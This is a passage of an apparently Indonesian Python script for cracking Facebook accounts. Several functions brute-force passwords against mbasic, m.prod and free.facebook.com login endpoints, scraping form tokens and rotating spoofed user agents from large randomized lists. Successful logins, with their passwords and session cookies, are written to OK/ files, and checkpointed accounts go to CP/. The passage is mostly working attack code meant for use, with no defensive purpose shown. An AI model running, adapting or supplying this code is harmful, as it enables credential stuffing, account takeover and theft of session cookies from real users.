    'referer': f'https://{fb}/login.php?skip_api_login=1&api_key=323875317805907&kid_directed_site=0&app_id=323875317805907&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D323875317805907%26cbt%3D1701110206896%26e2e%3D%257B%2522init%2522%253A1701110206896%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D49bb0dc9-1117-4292-81cb-fa13ca34776e%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522aa5e46d9-1d9f-49ac-8590-cf72f192db78%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rdagej3rhcvfvfmc7mec%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.jp.dena.showroom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DKzSef5xZTSOJz1CjQ1_y6bT1-VzK6nEnwxHQmJukpiQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daa5e46d9-1d9f-49ac-8590-cf72f192db78%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.jp.dena.showroom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522aa5e46d9-1d9f-49ac-8590-cf72f192db78%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rdagej3rhcvfvfmc7mec%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
			po = ses.post(f"https://{fb}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': kue}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}link login {k}{fb}{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}\n {x}USER2 {k}{ua2}\n {x}USER3 {k}{ua3}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}link login {h}{fb}{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}\n {x}USER2 {h}{ua2}\n {x}USER3 {h}{ua3}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
# ENCRYPTED SECTION
def crack3(idf,pwx,user_agent):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}3 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	rr = random.randint
	rc = random.choice
	links = random.choice(ling)
	nextt = random.choice(next)
	ua = random.choice(user)
	ua2 = random.choice(user2)
	ua3 = random.choice(user3)
	ses = requests.Session()
	for pw in pwx:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua if 'ua1' in zar else ua2 if 'ua2' in zar else ua3,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next={links}')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":nextt,"flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': f'"Not A;Brand";v="98", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua if 'ua1' in zar else ua2 if 'ua2' in zar else ua3,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next={links}','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}\n {x}USER2 {k}{ua2}\n {x}USER3 {k}{ua3}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}[{b}BERHASIL LOGIN{x}]{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}\n {x}USER2 {h}{ua2}\n {x}USER3 {h}{ua3}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
def crack4(idf,pwx,user_agent):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	ua = random.choice(user)
	ua2 = random.choice(user2)
	ua3 = random.choice(user3)
	prog.update(des,description=f'\r{h}4 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwx:
		try:
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua if 'ua1' in zar else ua2 if 'ua2' in zar else ua3,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}\n {x}USER2 {k}{ua2}\n {x}USER3 {k}{ua3}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}[{b}BERHASIL LOGIN{x}]{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}\n {x}USER2 {h}{ua2}\n {x}USER3 {h}{ua3}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
def crack5(idf,pwx,user_agent):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	ua = random.choice(user)
	ua2 = random.choice(user2)
	ua3 = random.choice(user3)
	prog.update(des,description=f'\r{h}5 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwx:
		try:
			link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'bi_xrwh': 92004344361786634
}
			headers = {
    "Host": "free.facebook.com",
    "Connection": "keep-alive",
    "Content-Length": "174",
    "Cache-Control": "max-age=0",
    "dpr": "2.549999952316284",
    "viewport-width": "980",
    "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "Android",
    "sec-ch-ua-platform-version": "",
    "sec-ch-ua-model": "",
    "sec-ch-ua-full-version-list": "",
    "sec-ch-prefers-color-scheme": "dark",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://free.facebook.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": ua if 'ua1' in zar else ua2 if 'ua2' in zar else ua3,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "X-Requested-With": "mark.via.gp",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
			link = random.choice(["https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}\n {x}USER2 {k}{ua2}\n {x}USER3 {k}{ua3}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}[{b}BERHASIL LOGIN{x}]{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}\n {x}USER2 {h}{ua2}\n {x}USER3 {h}{ua3}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
def cektahun(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']: tahunz = '2009'
        elif fx[:9] in ['100000000']: tahunz = '2009'
        elif fx[:8] in ['10000000']: tahunz = '2009'
        elif fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']: tahunz = '2009'
        elif fx[:7] in ['1000006', '1000007', '1000008', '1000009']: tahunz = '2010'
        elif fx[:6] in ['100001']: tahunz = '2010'
        elif fx[:6] in ['100002', '100003']: tahunz = '2011'
        elif fx[:6] in ['100004']: tahunz = '2012'
        elif fx[:6] in ['100005', '100006']: tahunz = '2013'
        elif fx[:6] in ['100007', '100008']: tahunz = '2014'
        elif fx[:6] in ['100009']: tahunz = '2015'
        elif fx[:5] in ['10001']: tahunz = '2016'
        elif fx[:5] in ['10002']: tahunz = '2017'
        elif fx[:5] in ['10003']: tahunz = '2018'
        elif fx[:5] in ['10004']: tahunz = '2019'
        elif fx[:5] in ['10005']: tahunz = '2020'
        elif fx[:5] in ['10006']: tahunz = '2021'
        elif fx[:5] in ['10009']: tahunz = '2023'
        elif fx[:5] in ['10007', '10008']: tahunz = '2022'
        else: tahunz = ''
    elif len(fx) in [9, 10]:
        tahunz = '2008'
    elif len(fx) == 8:
        tahunz = '2007'
    elif len(fx) == 7:
        tahunz = '2006'
    elif len(fx) == 14 and fx[:2] in ['61']:
        tahunz = '2024'
    else:
        tahunz = ''
    return tahunz
for zahra in range(10000):
	rr = random.randint; rc = random.choice
	versi_android = random.choice(['2','3','4','4.0.4','4.1.1','4.1.2','4.2.2','5','5.0','5.0.2','5.1.1','6','6.0','6.0.1','7','7.0','8','8.0.0','8.1','4.3','5.0','7.0','7.0.1','8.1.0','6.0.1;','10','11','12','13','14'])
	merk = random.choice(['SM-G850F','SM-G850FQ','SM-G850Y','SM-G850M','SM-G850T','SM-G850A','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','SM-J415GN','SM-J415N','SAMSUNG SM-T530','SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','SM-G850S','SM-G850L','SM-G850K','SM-E025F','SM-J415F','SM-J415FN','SM-J415G','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021)','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','SAMSUNG SM-G996B)','GT-S7500L','GT-S7500T'])
	bulid = random.choice(['Build/PPR1.180610.011; wv)','Build/QP1A.190711.020; wv)','Build/QKQ1.200308.002; wv)','Build/PKQ1.190414.001; wv)'])
	samsung = random.choice(['SamsungBrowser/96.4','SamsungBrowser/19.0','SamsungBrowser/9.2','SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
	chrome = random.choice(['87.0.4280.101','106.0.5249.126','55.0.2883.91','79.0.3945.116','92.0.4515.159','96.0.4664.45','92.0.4515.131','91.0.4472.101','91.0.4472.120','90.0.4430.91','51.0.2704.91','78.0.3904.108','107.0.5304.54','112.0.5615.48','73.0.3683.90','85.0.4183.127','85.0.4183.101','83.0.4103.106','85.0.4183.101','83.0.4103.106','74.0.3729.157','80.0.3987.162','80.0.3987.149','78.0.3904.108','112.0.0.0','113.0.5672.162','108.0.0.0','88.0.4324.141','92.0.4515.159','104.0.5112.97','61.0.3163.98','114.0.0.0','72.0.3626.76','37.0.0.0','47.0.2526.100','42.0.2311.111','69.0.3497.100'])
	model_bulid = random.choice(['CPH1853 Build/OPM1.171019.026; wv)','vivo 1612 Build/NRD90M; wv)','V2204 Build/SP1A.210812.003; wv)','vivo 1904 Build/RP1A.200720.012; wv)','V2207 Build/SP1A.210812.003; wv)','CPH1909 Build/O11019; wv)','CPH2591 Build/TP1A.220905.001; wv)','CPH2269 Build/RP1A.200720.011; wv)','21061119DG Build/RP1A.200720.011; wv)','Redmi 4A Build/N2G47H)','Redmi 5A Build/N2G47H)','M2006C3MG Build/QP1A.190711.020; wv)','M2010J19SC Build/QKQ1.200830.002; wv)','Redmi Note 8 Build/QKQ1.200114.002; wv)','220333QAG Build/RKQ1.211001.001; wv)','SM-G532G Build/MMB29T)','SM-J200H Build/LMY48B)','SM-J710F Build/NRD90M; wv)','SM-G610F Build/NRD90M)','SM-A107M Build/QP1A.190711.020; wv)','SM-A205U Build/PPR1.180610.011; wv)','SM-A215U Build/RP1A.200720.012; wv)'])
	model_bulid2 = random.choice(['CPH1853)','vivo 1612)','V2204)','vivo 1904)','V2207)','CPH1909)','CPH2591)','CPH2269)','21061119DG)','Redmi 4A)','Redmi 5A)','M2006C3MG)','M2010J19SC)','Redmi Note 8)','220333QAG)','SM-G532G)','SM-J200H)','SM-J710F)','SM-G610F)','SM-A107M)','SM-A205U)','SM-A215U)'])
	browser = random.choice(['OPR/53.2.2254.55976','HeyTapBrowser/45.10.5.1.1','[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]','YaApp_Android/9.85 YaSearchBrowser/9.85','[FB_IAB/FB4A;FBAV/405.0.0.23.72;]','SznProhlizec/10.1.2a','XiaoMi/MiuiBrowser/12.11.0-gn','GoogleApp/14.34.24.28.arm64','VivoBrowser/8.7.0.1'])
	firman = f"Mozilla/5.0 (Linux; Android {versi_android}; {model_bulid} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 {browser}"
	firzah = random.choice([firman])
	user.append(firzah)
for firzah in range(10000):
	rr = random.randint; rc = random.choice
	versi_android = random.choice(['2','3','4','4.0.4','4.1.1','4.1.2','4.2.2','5','5.0','5.0.2','5.1.1','6','6.0','6.0.1','7','7.0','8','8.0.0','8.1','4.3','5.0','7.0','7.0.1','8.1.0','6.0.1;','10','11','12','13','14'])
	os_versi = random.choice(['14_4_1)', '9_13_1)', '9_13_4)', '10_8_5)', '10_7_5)', '11_5_0)', '15_6_2)', '12_9_1)', '13_2_1)', '14_0_1)', '13_7_1)', '15_1_1)'])
	versi_os = random.choice(['14_4_1', '9_13_1', '9_13_4', '10_8_5', '10_7_5', '11_5_0', '15_6_2', '12_9_1', '13_2_1', '14_0_1', '13_7_1', '15_1_1'])
	chrome = random.choice(['87.0.4280.101','106.0.5249.126','55.0.2883.91','79.0.3945.116','92.0.4515.159','96.0.4664.45','92.0.4515.131','91.0.4472.101','91.0.4472.120','90.0.4430.91','51.0.2704.91','78.0.3904.108','107.0.5304.54','112.0.5615.48','73.0.3683.90','85.0.4183.127','85.0.4183.101','83.0.4103.106','85.0.4183.101','83.0.4103.106','74.0.3729.157','80.0.3987.162','80.0.3987.149','78.0.3904.108','112.0.0.0','113.0.5672.162','108.0.0.0','88.0.4324.141','92.0.4515.159','104.0.5112.97','61.0.3163.98','114.0.0.0','72.0.3626.76','37.0.0.0','47.0.2526.100','42.0.2311.111','69.0.3497.100'])
	firzah = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"
	iya = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {os_versi} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"
	firzahh = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"
	firman = f"Mozilla/5.0 (iPhone; CPU iPhone OS {versi_os} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
	dan = f"Mozilla/5.0 (Linux; Android {versi_android}; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
	zahra = f"Mozilla/5.0 (Linux; Android {versi_android}; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
	FIRZAH = random.choice([firzah,iya,firzahh,firman,dan,zahra])
	user2.append(FIRZAH)
for firman in range(10000):
	rr = random.randint; rc = random.choice
	versi_android = random.choice(['2','3','4','4.0.4','4.1.1','4.1.2','4.2.2','5','5.0','5.0.2','5.1.1','6','6.0','6.0.1','7','7.0','8','8.0.0','8.1','4.3','5.0','7.0','7.0.1','8.1.0','6.0.1;','10','11','12','13','14'])
